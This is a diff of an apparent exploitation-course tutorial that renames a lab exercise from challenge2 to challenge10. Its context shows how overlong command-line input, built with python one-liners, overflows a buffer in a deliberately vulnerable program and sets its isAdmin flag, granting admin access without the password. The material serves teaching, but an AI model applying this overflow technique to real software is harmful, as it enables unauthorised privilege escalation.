@@ -10,7 +10,7 @@ will change the function flow, which enables us to gain "admin" privileges.
 
 We have the following program:
 
-challenge2.c:
+challenge10.c:
 ```
 #include <stdio.h>
 #include <stdlib.h>
@@ -63,7 +63,7 @@ int main(int argc, char **argv) {
 }
 ```
 
-You can compile it by calling `make` in the folder `~/challenges/challenge2`
+You can compile it by calling `make` in the folder `~/challenges/challenge10`
 
 
 ## Normal behaviour
@@ -71,7 +71,7 @@ You can compile it by calling `make` in the folder `~/challenges/challenge2`
 Lets execute the program with normal length string, and with a wrong password:
 
 ```
-root@hlUbuntu32aslr:~/challenges/challenge2# ./challenge2 sheldon test
+root@hlUbuntu32aslr:~/challenges/challenge10# ./challenge10 sheldon test
 Hello cmd-sheldon.
 You are not admin.
 isAdmin: 0x0
@@ -80,7 +80,7 @@ isAdmin: 0x0
 Lets execute it with the correct password:
 
 ```
-root@hlUbuntu32aslr:~/challenges/challenge2# ./challenge2 sheldon ourteacheristehbest
+root@hlUbuntu32aslr:~/challenges/challenge10# ./challenge10 sheldon ourteacheristehbest
 Hello cmd-sheldon.
 You are admin!
 isAdmin: 0x1
@@ -95,7 +95,7 @@ What happens when you insert a string which is longer than 64 bytes? Lets try it
 We can use python to print 70 characters:
 
 ```
-root@hlUbuntu32aslr:~/challenges/challenge2# ./challenge2 `python -c 'print "A"*70'` root
+root@hlUbuntu32aslr:~/challenges/challenge10# ./challenge10 `python -c 'print "A"*70'` root
 Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
 You are admin!
 isAdmin: 0x41414141
@@ -106,7 +106,7 @@ isAdmin: 0x41414141
 What if we even add some more characters? Lets say 100.
 
 ```
-root@hlUbuntu32aslr:~/challenges/challenge2# ./challenge2 `python -c 'print "A"*100'` root
+root@hlUbuntu32aslr:~/challenges/challenge10# ./challenge10 `python -c 'print "A"*100'` root
 Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
 You are admin!
 isAdmin: 0x41414141
